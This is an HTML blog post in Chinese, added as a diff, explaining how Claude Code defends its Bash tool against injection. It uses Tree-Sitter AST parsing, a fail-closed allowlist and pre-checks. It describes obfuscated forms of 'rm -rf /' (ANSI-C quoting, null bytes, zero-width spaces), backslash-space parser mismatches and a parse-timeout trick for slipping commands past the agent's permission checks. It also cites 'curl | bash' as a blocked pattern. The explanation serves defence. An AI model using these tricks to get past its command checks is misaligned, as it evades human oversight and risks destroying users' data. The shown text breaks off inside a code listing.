@@ -1,0 +1,282 @@
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.160.1"><link rel="shortcut icon" type=image/x-icon href=/images/avatar.png><link rel=icon type=image/x-icon href=/images/avatar.png><link rel=icon type=image/png sizes=16x16 href=/images/avatar.png><link rel=icon type=image/png sizes=32x32 href=/images/avatar.png><link rel=apple-touch-icon sizes=180x180 href=/images/avatar.png><meta itemprop=name content="Claude Code 怎么防住 Bash 注入"><meta itemprop=description content="互联网那些事儿：NLP, 软件工程, 产品设计"><meta name=description content="互联网那些事儿：NLP, 软件工程, 产品设计"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://finisky.github.io/images/qrcode.webp"><meta itemprop=keywords content="LLM,LLM Agent,NLP"><meta property="og:type" content="article"><meta property="og:title" content="Claude Code 怎么防住 Bash 注入"><meta property="og:description" content="互联网那些事儿：NLP, 软件工程, 产品设计"><meta property="og:image" content="/images/qrcode.webp"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://finisky.github.io/claude-code-bash-security/"><meta property="og:site_name" content="Finisky Garden"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="finisky"><meta property="article:published_time" content="2026-04-05 20:15:33 +0800 CST"><meta property="article:modified_time" content="2026-04-05 20:15:33 +0800 CST"><link rel=alternate hreflang=en-US href=https://finisky.github.io/en/claude-code-bash-security/><link rel=alternate hreflang=zh-CN href=https://finisky.github.io/claude-code-bash-security/><link type=text/css rel=stylesheet href=https://finisky.github.io/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=https://finisky.github.io/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://finisky.github.io/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1777480353"><style type=text/css>.post-footer hr:after{content:""}.flinks-list-footer hr:after{content:""}</style><link rel=stylesheet type=text/css href="/css/custom_style.css?=1777480353"><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return 0[0];const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),0[0]):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://www.googletagmanager.com/gtag/js?id=G-K4DEGPDYSW",e.async="true",e.onload=function(){window.dataLayer=window.dataLayer||[];function e(){dataLayer.push(arguments)}e("js",new Date),e("config","G-K4DEGPDYSW ")},document.head.appendChild(e)})</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>Claude Code 怎么防住 Bash 注入 - Finisky Garden</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>Finisky Garden</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>NLP, 软件工程, 产品设计</p></div><div class=site-nav-right><div class="toggle popup-trigger"></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-nlp"><a href=/tags/nlp/ class=hvr-icon-pulse rel=section><i class="fa fa-wand-magic-sparkles hvr-icon"></i>NLP/AI</a></li><li class="menu-item menu-item-mongodb"><a href=/categories/mongodb/ class=hvr-icon-pulse rel=section><i class="fa fa-database hvr-icon"></i>MongoDB</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-th hvr-icon"></i>分类</a></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档</a></li><li class="menu-item menu-item-flinks"><a href=/flinks/ class=hvr-icon-pulse rel=section><i class="fa fa-link hvr-icon"></i>友链</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li></ul></nav></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><ul><li><a href=#规则引擎的天花板>规则引擎的天花板</a></li><li><a href=#换一种思路allowlist-而非-blocklist>换一种思路：Allowlist 而非 Blocklist</a></li><li><a href=#解析器差异真正的安全边界>解析器差异：真正的安全边界</a></li><li><a href=#看不见的字符>看不见的字符</a></li><li><a href=#反斜杠空格两个解析器的分歧>反斜杠空格：两个解析器的分歧</a></li><li><a href=#解析超时是可以被利用的>解析超时是可以被利用的</a></li><li><a href=#bash-的怪脾气eval-和它的朋友们>Bash 的怪脾气：eval 和它的朋友们</a></li><li><a href=#数组下标里藏的炸弹>数组下标里藏的炸弹</a></li><li><a href=#zsh另一个战场>Zsh：另一个战场</a></li><li><a href=#变量作用域追踪>变量作用域追踪</a></li><li><a href=#包装命令的层层剥离>包装命令的层层剥离</a></li><li><a href=#两套系统的并行>两套系统的并行</a></li><li><a href=#注释里的攻防史>注释里的攻防史</a></li><li><a href=#纵深防御的哲学>纵深防御的哲学</a></li></ul></li></ul></nav></div><div class="sidebar-qrcode animated" style="text-align:center;margin-top:8px;padding:4px 0"><img src=/images/qrcode.webp alt="QR Code" style=width:90px;height:90px;border-radius:4px><p style=margin-top:4px;font-size:.75em;color:#999>扫码关注公众号</p></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=finisky src=/imgs/img-lazy-loading.gif data-src=/images/qrcode.webp><div class=site-description>扫码关注公众号</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>199</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>16</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>61</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"></div></div></div></div><div class=sidebar-card-widget><div class=related-posts-header>相关文章</div><div class=related-posts-list><ul><li><i class="fa fa-chevron-right"></i>
+<a href=/dive-into-claude-code/>Claude Code：1.6% 的 AI，98.4% 的脚手架</a></li><li><i class="fa fa-chevron-right"></i>
+<a href=/prompt-context-harness-engineering/>Agent 工程的三次进化</a></li><li><i class="fa fa-chevron-right"></i>
+<a href=/openclaw-vs-claude-code-agent-arch/>Claude Code 和 OpenClaw 的上下文管理对比</a></li><li><i class="fa fa-chevron-right"></i>
+<a href=/foundation-model-plateau-application-era/>基模到顶，应用起飞</a></li><li><i class="fa fa-chevron-right"></i>
+<a href=/claude-code-deferred-tools/>Claude Code 的工具按需加载</a></li></ul></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://finisky.github.io/claude-code-bash-security/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/images/qrcode.webp"><meta itemprop=name content="finisky"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="finisky"><meta itemprop=description content="互联网那些事儿：NLP, 软件工程, 产品设计"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="Claude Code 怎么防住 Bash 注入"><meta itemprop=description content='
+    AI 执行 Bash 命令的安全问题，不是"该不该信任模型"，而是"怎么确认命令的含义和它看起来的一样"。
+
+  
+Claude Code 允许 AI 直接执行 Bash 命令。不是通过 MCP 那样的结构化接口间接调用，是真给模型开了一个 shell。MCP 的思路是把工具封装成 JSON schema，安全是安全了，但你不可能为几千个 CLI 工具逐个写 adapter，能力天花板肉眼可见。直接给 Bash，什么都能干，代价是安全问题从"接口权限控制"变成了"搞懂这条命令到底在干嘛"。上一篇聊了 YOLO Classifier 怎么用 AI 审查 AI，但 YOLO Classifier 看到的是完整的命令字符串，它做的是语义判断：这个操作危不危险。在那之前，还有一层更底层的问题需要回答：这个命令真的是它看起来的那个意思吗？'></span><header class=post-header><h1 class=post-title itemprop="name headline">Claude Code 怎么防住 Bash 注入</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
+</span><span class=post-meta-item-text title=发表于>发表于：
+</span><time title="创建时间：2026-04-05 20:15:33 +08:00" itemprop="dateCreated datePublished" datetime="2026-04-05 20:15:33 +0800 CST">2026-04-05
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
+</span><span class=post-meta-item-text title=分类于>分类于：
+</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/nlp/ itemprop=url rel=index><span itemprop=name>NLP</span>
+</a></span></span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
+</span><span class=post-meta-item-text>阅读：&ap;</span>
+<span>10分钟</span>
+</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
+</span><span class=post-meta-item-text>浏览：
+</span><span id=pageview-count data-path=/claude-code-bash-security/><i class="fa fa-sync fa-spin"></i>
+</span></span><span class=post-meta-item title><span class=post-meta-item-icon><i class="fas fa-solid fa-comments"></i>
+</span><span class=post-meta-item-text title=评论>评论：
+</span><span id=comments-count data-path=/claude-code-bash-security/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><blockquote><p>AI 执行 Bash 命令的安全问题，不是"该不该信任模型"，而是"怎么确认命令的含义和它看起来的一样"。</p></blockquote><p>Claude Code 允许 AI 直接执行 Bash 命令。不是通过 MCP 那样的结构化接口间接调用，是真给模型开了一个 shell。MCP 的思路是把工具封装成 JSON schema，安全是安全了，但你不可能为几千个 CLI 工具逐个写 adapter，能力天花板肉眼可见。直接给 Bash，什么都能干，代价是安全问题从"接口权限控制"变成了"搞懂这条命令到底在干嘛"。上一篇聊了 YOLO Classifier 怎么用 AI 审查 AI，但 YOLO Classifier 看到的是完整的命令字符串，它做的是语义判断：这个操作危不危险。在那之前，还有一层更底层的问题需要回答：这个命令真的是它看起来的那个意思吗？</p><a id=more></a><p>这不是修辞。Bash 是一门出了名的"看起来 A，执行起来是 B"的语言。<code>echo hello</code> 谁都看得懂，但 <code>echo$'\x20'-rf$'\x20'/</code> 呢？视觉上看着无害，执行起来可能是灾难。</p><p>Claude Code 的解法是用 Tree-Sitter 做 AST 分析，把每条命令解析成结构化的 argv 数组，再对 argv 做权限匹配。这套系统的设计哲学可以用一句话概括：不理解的东西一律不放行。</p><h2 id=规则引擎的天花板>规则引擎的天花板
+<a class=header-anchor href=#%e8%a7%84%e5%88%99%e5%bc%95%e6%93%8e%e7%9a%84%e5%a4%a9%e8%8a%b1%e6%9d%bf></a></h2><p>最朴素的安全方案是正则匹配：看到 <code>rm -rf /</code> 就拦，看到 <code>curl | bash</code> 就拦。Claude Code 的早期版本确实有一套这样的系统，23 个正则 Validator，覆盖了从命令替换到 Unicode 空白字符的各种攻击面。</p><p>问题在于 Bash 的引号规则极其复杂。同一个命令可以有无数种等价写法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1>1</a>
+</span><span class=lnt id=hl-0-2><a class=lnlinks href=#hl-0-2>2</a>
+</span><span class=lnt id=hl-0-3><a class=lnlinks href=#hl-0-3>3</a>
+</span><span class=lnt id=hl-0-4><a class=lnlinks href=#hl-0-4>4</a>
+</span><span class=lnt id=hl-0-5><a class=lnlinks href=#hl-0-5>5</a>
+</span><span class=lnt id=hl-0-6><a class=lnlinks href=#hl-0-6>6</a>
+</span><span class=lnt id=hl-0-7><a class=lnlinks href=#hl-0-7>7</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Regex sees:                  Bash executes:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>echo hello                   echo hello          (same)
+</span></span><span class=line><span class=cl>echo$&#39;\x20&#39;hello             echo hello          (ANSI-C quoting)
+</span></span><span class=line><span class=cl>echo&#34;&#34;hello                  echo hello          (empty quote concat)
+</span></span><span class=line><span class=cl>echo\                        echo hello          (line continuation)
+</span></span><span class=line><span class=cl>hello</span></span></code></pre></td></tr></table></div></div><p>正则做的是字符串匹配，它看到的是命令长什么样。但安全判断需要知道命令是什么意思，这中间的差距就是攻击面。</p><p>更糟的是，正则引擎要先做"引号剥离"才能分析命令结构，而引号剥离本身就是一个 mini parser。一旦这个 mini parser 和 Bash 的理解不一致，就会产生差异攻击。代码注释里记录了几十种这类绕过，每一种都是一个独立的 CVE 级别的发现。</p><h2 id=换一种思路allowlist-而非-blocklist>换一种思路：Allowlist 而非 Blocklist
+<a class=header-anchor href=#%e6%8d%a2%e4%b8%80%e7%a7%8d%e6%80%9d%e8%b7%afallowlist-%e8%80%8c%e9%9d%9e-blocklist></a></h2><p>新架构完全抛弃了"检测坏东西"的思路，改成"只放行已理解的结构"。</p><p>用 Tree-Sitter 把命令解析成 AST，然后用显式允许列表遍历：只有在列表里的节点类型才递归处理，所有不认识的节点类型直接返回 too-complex，交给用户确认。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1> 1</a>
+</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2> 2</a>
+</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3> 3</a>
+</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4> 4</a>
+</span><span class=lnt id=hl-1-5><a class=lnlinks href=#hl-1-5> 5</a>
+</span><span class=lnt id=hl-1-6><a class=lnlinks href=#hl-1-6> 6</a>
+</span><span class=lnt id=hl-1-7><a class=lnlinks href=#hl-1-7> 7</a>
+</span><span class=lnt id=hl-1-8><a class=lnlinks href=#hl-1-8> 8</a>
+</span><span class=lnt id=hl-1-9><a class=lnlinks href=#hl-1-9> 9</a>
+</span><span class=lnt id=hl-1-10><a class=lnlinks href=#hl-1-10>10</a>
+</span><span class=lnt id=hl-1-11><a class=lnlinks href=#hl-1-11>11</a>
+</span><span class=lnt id=hl-1-12><a class=lnlinks href=#hl-1-12>12</a>
+</span><span class=lnt id=hl-1-13><a class=lnlinks href=#hl-1-13>13</a>
+</span><span class=lnt id=hl-1-14><a class=lnlinks href=#hl-1-14>14</a>
+</span><span class=lnt id=hl-1-15><a class=lnlinks href=#hl-1-15>15</a>
+</span><span class=lnt id=hl-1-16><a class=lnlinks href=#hl-1-16>16</a>
+</span><span class=lnt id=hl-1-17><a class=lnlinks href=#hl-1-17>17</a>
+</span><span class=lnt id=hl-1-18><a class=lnlinks href=#hl-1-18>18</a>
+</span><span class=lnt id=hl-1-19><a class=lnlinks href=#hl-1-19>19</a>
+</span><span class=lnt id=hl-1-20><a class=lnlinks href=#hl-1-20>20</a>
+</span><span class=lnt id=hl-1-21><a class=lnlinks href=#hl-1-21>21</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Input: &#34;npm test &amp;&amp; git status&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                  program
+</span></span><span class=line><span class=cl>                 /   |   \
+</span></span><span class=line><span class=cl>           command  &#39;&amp;&amp;&#39;  command
+</span></span><span class=line><span class=cl>           /    \          /    \
+</span></span><span class=line><span class=cl>        word   word     word   word
+</span></span><span class=line><span class=cl>         |      |        |      |
+</span></span><span class=line><span class=cl>       &#34;npm&#34;  &#34;test&#34;   &#34;git&#34; &#34;status&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>AST allowlist walk:
+</span></span><span class=line><span class=cl>  program     -&gt; STRUCTURAL (recurse)
+</span></span><span class=line><span class=cl>  &#39;&amp;&amp;&#39;        -&gt; SEPARATOR  (skip)
+</span></span><span class=line><span class=cl>  command     -&gt; LEAF       (extract argv)
+</span></span><span class=line><span class=cl>  word        -&gt; ARGUMENT   (resolve text)
+</span></span><span class=line><span class=cl>  ???         -&gt; TOO-COMPLEX (block)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Result: [
+</span></span><span class=line><span class=cl>  {argv: [&#34;npm&#34;, &#34;test&#34;]},
+</span></span><span class=line><span class=cl>  {argv: [&#34;git&#34;, &#34;status&#34;]}
+</span></span><span class=line><span class=cl>]</span></span></code></pre></td></tr></table></div></div><p>这个设计的核心在于对未知的处理方式。传统 blocklist 的默认态度是"不在黑名单里就放行"。Allowlist 的默认态度是"不在白名单里就拦截"。一个新的 Bash 语法特性被加入 Tree-Sitter 后，如果 allowlist 没有更新，它会被自动拦截，不是自动放行。</p><p>代码开头的注释写得很清楚：&ldquo;The key design property is FAIL-CLOSED: we never interpret structure we don&rsquo;t understand.&rdquo;</p><h2 id=解析器差异真正的安全边界>解析器差异：真正的安全边界
+<a class=header-anchor href=#%e8%a7%a3%e6%9e%90%e5%99%a8%e5%b7%ae%e5%bc%82%e7%9c%9f%e6%ad%a3%e7%9a%84%e5%ae%89%e5%85%a8%e8%be%b9%e7%95%8c></a></h2><p>但 Tree-Sitter 不是 Bash。它是一个通用的增量解析框架，用 Bash 的 grammar 文件生成解析器。这个解析器和真实的 Bash 在绝大多数情况下行为一致，但在边缘情况下会产生差异。</p><p>这些差异就是攻击面。</p><p>Claude Code 在 AST 遍历之前，先跑一组预检查，专门捕捉已知的 Tree-Sitter/Bash 差异：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1> 1</a>
+</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2> 2</a>
+</span><span class=lnt id=hl-2-3><a class=lnlinks href=#hl-2-3> 3</a>
+</span><span class=lnt id=hl-2-4><a class=lnlinks href=#hl-2-4> 4</a>
+</span><span class=lnt id=hl-2-5><a class=lnlinks href=#hl-2-5> 5</a>
+</span><span class=lnt id=hl-2-6><a class=lnlinks href=#hl-2-6> 6</a>
+</span><span class=lnt id=hl-2-7><a class=lnlinks href=#hl-2-7> 7</a>
+</span><span class=lnt id=hl-2-8><a class=lnlinks href=#hl-2-8> 8</a>
+</span><span class=lnt id=hl-2-9><a class=lnlinks href=#hl-2-9> 9</a>
+</span><span class=lnt id=hl-2-10><a class=lnlinks href=#hl-2-10>10</a>
+</span><span class=lnt id=hl-2-11><a class=lnlinks href=#hl-2-11>11</a>
+</span><span class=lnt id=hl-2-12><a class=lnlinks href=#hl-2-12>12</a>
+</span><span class=lnt id=hl-2-13><a class=lnlinks href=#hl-2-13>13</a>
+</span><span class=lnt id=hl-2-14><a class=lnlinks href=#hl-2-14>14</a>
+</span><span class=lnt id=hl-2-15><a class=lnlinks href=#hl-2-15>15</a>
+</span><span class=lnt id=hl-2-16><a class=lnlinks href=#hl-2-16>16</a>
+</span><span class=lnt id=hl-2-17><a class=lnlinks href=#hl-2-17>17</a>
+</span><span class=lnt id=hl-2-18><a class=lnlinks href=#hl-2-18>18</a>
+</span><span class=lnt id=hl-2-19><a class=lnlinks href=#hl-2-19>19</a>
+</span><span class=lnt id=hl-2-20><a class=lnlinks href=#hl-2-20>20</a>
+</span><span class=lnt id=hl-2-21><a class=lnlinks href=#hl-2-21>21</a>
+</span><span class=lnt id=hl-2-22><a class=lnlinks href=#hl-2-22>22</a>
+</span><span class=lnt id=hl-2-23><a class=lnlinks href=#hl-2-23>23</a>
+</span><span class=lnt id=hl-2-24><a class=lnlinks href=#hl-2-24>24</a>
+</span><span class=lnt id=hl-2-25><a class=lnlinks href=#hl-2-25>25</a>
+</span><span class=lnt id=hl-2-26><a class=lnlinks href=#hl-2-26>26</a>
+</span><span class=lnt id=hl-2-27><a class=lnlinks href=#hl-2-27>27</a>
+</span><span class=lnt id=hl-2-28><a class=lnlinks href=#hl-2-28>28</a>
+</span><span class=lnt id=hl-2-29><a class=lnlinks href=#hl-2-29>29</a>
+</span><span class=lnt id=hl-2-30><a class=lnlinks href=#hl-2-30>30</a>
+</span><span class=lnt id=hl-2-31><a class=lnlinks href=#hl-2-31>31</a>
+</span><span class=lnt id=hl-2-32><a class=lnlinks href=#hl-2-32>32</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Command input
+</span></span><span class=line><span class=cl>      |
+</span></span><span class=line><span class=cl>      v
+</span></span><span class=line><span class=cl>+--------------------------------------------------+
+</span></span><span class=line><span class=cl>|  PRE-CHECKS (before trusting tree-sitter)        |
+</span></span><span class=line><span class=cl>|                                                  |
+</span></span><span class=line><span class=cl>|  Control chars?    \x00-\x08, \x7F               |
+</span></span><span class=line><span class=cl>|  Unicode spaces?   NBSP, zero-width, BOM         |
+</span></span><span class=line><span class=cl>|  Backslash + WS?   echo\ test                    |
+</span></span><span class=line><span class=cl>|  Zsh ~[name]?      dynamic directory hook         |
+</span></span><span class=line><span class=cl>|  Zsh =cmd?         equals expansion               |
+</span></span><span class=line><span class=cl>|  Brace + quote?    {a&#39;}&#39;,b}                       |
+</span></span><span class=line><span class=cl>|                                                  |
+</span></span><span class=line><span class=cl>|  Any hit -&gt; too-complex (don&#39;t trust AST)        |
+</span></span><span class=line><span class=cl>+--------------------------------------------------+
+</span></span><span class=line><span class=cl>      |  (all clear)
+</span></span><span class=line><span class=cl>      v
+</span></span><span class=line><span class=cl>+--------------------------------------------------+
+</span></span><span class=line><span class=cl>|  TREE-SITTER PARSE                               |
+</span></span><span class=line><span class=cl>|  Timeout: 50ms    Node budget: 50,000            |
+</span></span><span class=line><span class=cl>|  Abort -&gt; too-complex (not parse-unavailable!)   |
+</span></span><span class=line><span class=cl>+--------------------------------------------------+
+</span></span><span class=line><span class=cl>      |  (parse succeeded)
+</span></span><span class=line><span class=cl>      v
+</span></span><span class=line><span class=cl>+--------------------------------------------------+
+</span></span><span class=line><span class=cl>|  ALLOWLIST WALK                                  |
+</span></span><span class=line><span class=cl>|  Known node type -&gt; recurse / extract            |
+</span></span><span class=line><span class=cl>|  Unknown node type -&gt; too-complex                |
+</span></span><span class=line><span class=cl>+--------------------------------------------------+
+</span></span><span class=line><span class=cl>      |
+</span></span><span class=line><span class=cl>      v
+</span></span><span class=line><span class=cl>  SimpleCommand[] or too-complex</span></span></code></pre></td></tr></table></div></div><p>每个预检查都对应一个具体的攻击向量。挑几个有意思的展开。</p><h2 id=看不见的字符>看不见的字符
+<a class=header-anchor href=#%e7%9c%8b%e4%b8%8d%e8%a7%81%e7%9a%84%e5%ad%97%e7%ac%a6></a></h2><p>Unicode 有一堆"空白字符"在终端上要么不可见，要么显示成普通空格。NBSP（\u00A0）、零宽空格（\u200B）、BOM（\uFEFF）这些字符，Tree-Sitter 可能把它们当作词分隔符，但 Bash 把它们当作普通字符。</p><p>攻击场景：模型生成一条看起来人畜无害的命令，但中间夹了一个零宽空格。Tree-Sitter 认为这是两个词，安全分析按两个词处理。Bash 却认为这是一个词，执行的是完全不同的命令。</p><p>代码里列了一整页 Unicode 空白字符的编码，从 \u00A0 到 \uFEFF，全部拦截。</p><p>同样的逻辑适用于控制字符。Bash 会静默丢弃 null 字节（\x00），但 Tree-Sitter 不会。<code>rm\x00 -rf /</code> 在 Tree-Sitter 里可能是一个词 <code>rm\x00</code>，但 Bash 执行的是 <code>rm -rf /</code>。</p><h2 id=反斜杠空格两个解析器的分歧>反斜杠空格：两个解析器的分歧
+<a class=header-anchor href=#%e5%8f%8d%e6%96%9c%e6%9d%a0%e7%a9%ba%e6%a0%bc%e4%b8%a4%e4%b8%aa%e8%a7%a3%e6%9e%90%e5%99%a8%e7%9a%84%e5%88%86%e6%ad%a7></a></h2><p><code>echo\ test</code> 这个命令，Bash 认为 <code>\ </code>是一个转义空格，所以 <code>echo test</code> 是一个词（参数里包含空格的 echo）。Tree-Sitter 返回的 .text 却是 <code>echo\ test</code>（带反斜杠），argv[0] 和 Bash 理解的不一样。</p><p>这不只是理论上的问题。如果安全系统信任 Tree-Sitter 的 argv[0] 是 <code>echo\ test</code>，那它不会匹配 echo 的权限规则。但 Bash 实际执行的就是 echo。</p><p>解法很粗暴但有效：只要命令里出现反斜杠后面跟空白字符的模式，直接拦截。这种写法极其罕见，用引号改写就行。</p><h2 id=解析超时是可以被利用的>解析超时是可以被利用的
+<a class=header-anchor href=#%e8%a7%a3%e6%9e%90%e8%b6%85%e6%97%b6%e6%98%af%e5%8f%af%e4%bb%a5%e8%a2%ab%e5%88%a9%e7%94%a8%e7%9a%84></a></h2><p>Tree-Sitter 的解析有时间和资源限制：50 毫秒超时，50000 个节点上限。这看起来是性能保护，但有安全含义。</p><p>代码注释里写了一个具体的攻击：<code>(( a[0][0][0]... ))</code> 嵌套大约 2800 层数组下标，可以触发解析超时。如果超时后 fallback 到旧的正则系统，而正则系统缺少某些检查（比如 EVAL_LIKE_BUILTINS），攻击者就可以绕过。</p><p>解法：超时不返回 parse-unavailable（会 fallback 到旧系统），而是返回 too-complex（直接拦截）。注释说"Adversarially triggerable — fail closed: too-complex → ask."</p><h2 id=bash-的怪脾气eval-和它的朋友们>Bash 的怪脾气：eval 和它的朋友们
+<a class=header-anchor href=#bash-%e7%9a%84%e6%80%aa%e8%84%be%e6%b0%94eval-%e5%92%8c%e5%ae%83%e7%9a%84%e6%9c%8b%e5%8f%8b%e4%bb%ac></a></h2><p>AST 解析能把命令拆成 argv 数组，但有些命令的 argv 看着完全无害，执行起来却是另一回事。这类命令叫 eval-like builtins，它们把参数当 shell 代码执行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1> 1</a>
+</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2> 2</a>
+</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3> 3</a>
+</span><span class=lnt id=hl-3-4><a class=lnlinks href=#hl-3-4> 4</a>
+</span><span class=lnt id=hl-3-5><a class=lnlinks href=#hl-3-5> 5</a>
+</span><span class=lnt id=hl-3-6><a class=lnlinks href=#hl-3-6> 6</a>
+</span><span class=lnt id=hl-3-7><a class=lnlinks href=#hl-3-7> 7</a>
+</span><span class=lnt id=hl-3-8><a class=lnlinks href=#hl-3-8> 8</a>
+</span><span class=lnt id=hl-3-9><a class=lnlinks href=#hl-3-9> 9</a>
+</span><span class=lnt id=hl-3-10><a class=lnlinks href=#hl-3-10>10</a>
+</span><span class=lnt id=hl-3-11><a class=lnlinks href=#hl-3-11>11</a>
+</span><span class=lnt id=hl-3-12><a class=lnlinks href=#hl-3-12>12</a>
+</span><span class=lnt id=hl-3-13><a class=lnlinks href=#hl-3-13>13</a>
+</span><span class=lnt id=hl-3-14><a class=lnlinks href=#hl-3-14>14</a>
+</span><span class=lnt id=hl-3-15><a class=lnlinks href=#hl-3-15>15</a>
+</span><span class=lnt id=hl-3-16><a class=lnlinks href=#hl-3-16>16</a>
+</span><span class=lnt id=hl-3-17><a class=lnlinks href=#hl-3-17>17</a>
